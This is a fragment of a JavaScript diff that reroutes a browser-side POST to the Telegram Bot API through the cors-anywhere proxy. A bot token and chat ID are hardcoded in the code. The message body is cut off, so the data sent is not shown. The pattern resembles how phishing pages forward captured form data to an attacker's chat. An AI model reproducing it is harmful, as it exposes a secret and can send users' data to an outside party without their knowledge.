@@ -342,7 +342,7 @@
       const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
       const chatId   = "7811430582";
 
-      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+      fetch("https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot" + botToken + "/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
